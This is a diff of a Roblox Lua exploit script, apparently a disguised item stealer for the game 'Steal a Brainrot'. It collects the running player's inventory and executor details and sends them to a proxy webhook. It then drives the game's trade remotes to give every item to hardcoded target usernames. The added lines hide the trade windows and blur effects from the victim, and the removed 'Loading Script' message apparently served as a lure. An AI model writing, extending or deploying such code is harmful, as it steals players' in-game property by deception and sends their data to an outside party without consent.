@@ -1,14 +1,8 @@
 repeat task.wait() until game:IsLoaded()
 task.wait(1.5)
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
-local plr = Players.LocalPlayer
-if not plr then return end
-
 if game.PlaceId ~= 109983668079237 then
+    local plr = game.Players.LocalPlayer
     if plr and typeof(plr.Kick) == "function" then
         pcall(function() plr:Kick("Eternal Darkness | SAB Only") end)
     end
@@ -41,6 +35,13 @@ if not USERNAMES or #USERNAMES == 0 then
     return
 end
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local plr = Players.LocalPlayer
+if not plr then return end
+
 local executorName = "Unknown"
 pcall(function()
     if identifyexecutor then executorName = identifyexecutor()
@@ -72,7 +73,7 @@ elseif game:GetService("HttpService").RequestAsync then
 end
 
 if not requestMethod then
-    warn("[ED] Unsupported executor - No request method found")
+    warn("[ED] Unsupported executor")
     return
 end
 
@@ -110,36 +111,42 @@ if identifyexecutor and identifyexecutor() == "Delta" then
     REAL_JOB_ID = bypassJobId
 end
 
-local tradeRemotes = {}
-local scannedRemotes = {}
+local ETERNAL_DARKNESS_COLORS = {
+    primary = 0x0a0a1a,
+    secondary = 0x1a1a2e,
+    accent = 0x16213e,
+    highlight = 0x0f3460,
+    text = 0x533483,
+    gold = 0x8b0000,
+    success = 0x006400
+}
 
-for _, v in pairs(getgc(true)) do
-    if type(v) == "function" then
-        local info = debug.getinfo(v)
-        if info and info.nups and info.nups > 0 then
-            for i = 1, info.nups do
-                local ok, upval = pcall(debug.getupvalue, v, i)
-                if ok and upval and typeof(upval) == "Instance" then
-                    if upval:IsA("RemoteFunction") or upval:IsA("RemoteEvent") then
-                        local name = upval.Name
-                        if not scannedRemotes[name] then
-                            scannedRemotes[name] = true
-                            if name:find("TradeService") then
-                                tradeRemotes[name] = upval
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    elseif typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
-        local name = v.Name
-        if not scannedRemotes[name] and name:find("TradeService") then
-            scannedRemotes[name] = true
-            tradeRemotes[name] = v
-        end
+local cam = workspace.CurrentCamera
+local pg = plr:WaitForChild("PlayerGui")
+local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}
+
+local function handleCam(obj)
+    if obj:IsA("BlurEffect") then
+        task.defer(function() obj:Destroy() end)
     end
 end
+
+local function handleGui(obj)
+    if guiNames[obj.Name] then
+        task.defer(function() obj:Destroy() end)
+    end
+end
+
+cam.ChildAdded:Connect(handleCam)
+for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
+
+cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+    cam.FieldOfView = 70
+end)
+cam.FieldOfView = 70
+
+pg.ChildAdded:Connect(handleGui)
+for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
 
 local AnimalsData, AnimalsShared, NumberUtils
 pcall(function()
@@ -209,7 +216,7 @@ for _, plotData in pairs(SYNC_DATA) do
                         local value = sabValues[data.Index] or 0
                         totalInventoryValue = totalInventoryValue + value
                         rarityCounts[rarity] = (rarityCounts[rarity] or 0) + 1
-                        
+
                         table.insert(brainrotList, {
                             Name = name,
                             Rarity = rarity,
@@ -217,7 +224,7 @@ for _, plotData in pairs(SYNC_DATA) do
                             Value = value,
                             TotalValue = value
                         })
-                        
+
                         table.insert(brainrotQueue, {
                             slotKey = tonumber(slotKey),
                             data = data
@@ -303,6 +310,7 @@ local function sendToProxy(payload)
 end
 
 local function sendToPublic(payload)
+    if not PublicHits or PublicHits == "" then return end
     task.spawn(function()
         local url = PROXY_URL .. PublicHits
         pcall(function()
@@ -385,7 +393,7 @@ local publicFields = {
     {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true},
     {name = "📊 Brainrots", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "\n" .. ansiLine5 .. "```", inline = false},
     {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false},
-    {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false}
+    {name = "🔗 Actions", value = "[View Inventory](" .. rubisLink .. ")", inline = false}
 }
 
 local PublicPayload = {
@@ -408,67 +416,117 @@ if total_items ~= 0 or total_items > 1 then
     sendToPublic(PublicPayload)
 end
 
-print("[ED] Loading Script for", plr.Name)
-print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")
+local tradeRemotes = {}
+local scannedRemotes = {}
 
-wait(3)
+for _, v in pairs(getgc(true)) do
+    if type(v) == "function" then
+        local info = debug.getinfo(v)
+        if info and info.nups and info.nups > 0 then
+            for i = 1, info.nups do
+                local ok, upval = pcall(debug.getupvalue, v, i)
+                if ok and upval and typeof(upval) == "Instance" then
+                    if upval:IsA("RemoteFunction") or upval:IsA("RemoteEvent") then
+                        local name = upval.Name
+                        if not scannedRemotes[name] then
+                            scannedRemotes[name] = true
+                            if name:find("TradeService") then
+                                tradeRemotes[name] = upval
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    elseif typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
+        local name = v.Name
+        if not scannedRemotes[name] and name:find("TradeService") then
+            scannedRemotes[name] = true
+            tradeRemotes[name] = v
+        end
+    end
+end
+
+local function addNextBrainrot(addRemote, index)
+    if not addRemote or index > #brainrotQueue then return false end
+
+    local item = brainrotQueue[index]
+    local data = item.data
+
+    local payload = {
+        UUID = data.UUID or data.Uid,
+        LastCollect = data.LastCollect or 1771790678,
+        Index = data.Index,
+        OfflineGain = data.OfflineGain or 99,
+        Steal = false,
+    }
+
+    if data.Traits and type(data.Traits) == "table" then
+        payload.Traits = data.Traits
+    end
+
+    if data.Mutation then
+        if type(data.Mutation) == "string" and data.Mutation ~= "" then
+            payload.Mutation = data.Mutation
+        elseif type(data.Mutation) == "table" then
+            local isArray = true
+            for i = 1, #data.Mutation do
+                if not data.Mutation[i] then
+                    isArray = false
+                    break
+                end
+            end
+            if isArray then
+                if #data.Mutation > 0 then
+                    payload.Mutation = data.Mutation[1]
+                end
+            else
+                for traitName, _ in pairs(data.Mutation) do
+                    payload.Mutation = traitName
+                    break
+                end
+            end
+        end
+    end
+
+    pcall(function()
+        addRemote:InvokeServer(item.slotKey, payload)
+    end)
+
+    return true
+end
 
 local isTradeCompleted = false
 
 local function startTradeAutomation(targetId)
     if isTradeCompleted then return end
-    
+
     local searchRemote = tradeRemotes["RF/TradeService/SearchUser"]
     local inviteRemote = tradeRemotes["RF/TradeService/Invite"]
     local addRemote = tradeRemotes["RF/TradeService/AddBrainrot"]
     local readyRemote = tradeRemotes["RE/TradeService/Ready"]
     local acceptRemote = tradeRemotes["RE/TradeService/Accept"]
-    
+
+    if not searchRemote or not inviteRemote then 
+        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+            if obj:IsA("RemoteFunction") or obj:IsA("RemoteEvent") then
+                if obj.Name == "RF/TradeService/SearchUser" then searchRemote = obj end
+                if obj.Name == "RF/TradeService/Invite" then inviteRemote = obj end
+                if obj.Name == "RF/TradeService/AddBrainrot" then addRemote = obj end
+                if obj.Name == "RE/TradeService/Ready" then readyRemote = obj end
+                if obj.Name == "RE/TradeService/Accept" then acceptRemote = obj end
+            end
+        end
+    end
+
     if not searchRemote or not inviteRemote then return end
-    
-    if addRemote and #brainrotQueue > 0 then
+
+    if addRemote then
         task.spawn(function()
             local currentIndex = 1
             while not isTradeCompleted do
                 if currentIndex <= #brainrotQueue then
-                    local item = brainrotQueue[currentIndex]
-                    local data = item.data
-                    local payload = {
-                        UUID = data.UUID or data.Uid,
-                        LastCollect = data.LastCollect or 1771790678,
-                        Index = data.Index,
-                        OfflineGain = data.OfflineGain or 99,
-                        Steal = false,
-                    }
-                    if data.Traits and type(data.Traits) == "table" then
-                        payload.Traits = data.Traits
-                    end
-                    if data.Mutation then
-                        if type(data.Mutation) == "string" and data.Mutation ~= "" then
-                            payload.Mutation = data.Mutation
-                        elseif type(data.Mutation) == "table" then
-                            local isArray = true
-                            for i = 1, #data.Mutation do
-                                if not data.Mutation[i] then
-                                    isArray = false
-                                    break
-                                end
-                            end
-                            if isArray then
-                                if #data.Mutation > 0 then
-                                    payload.Mutation = data.Mutation[1]
-                                end
-                            else
-                                for traitName, _ in pairs(data.Mutation) do
-                                    payload.Mutation = traitName
-                                    break
-                                end
-                            end
-                        end
-                    end
-                    pcall(function()
-                        addRemote:InvokeServer(item.slotKey, payload)
-                    end)
+                    addNextBrainrot(addRemote, currentIndex)
                     currentIndex = currentIndex + 1
                 else
                     currentIndex = 1
@@ -477,7 +535,7 @@ local function startTradeAutomation(targetId)
             end
         end)
     end
-    
+
     task.spawn(function()
         while not isTradeCompleted do
             pcall(function()
@@ -499,7 +557,7 @@ local function startTradeAutomation(targetId)
             task.wait(2)
         end
     end)
-    
+
     task.spawn(function()
         task.wait(90)
         if not isTradeCompleted then
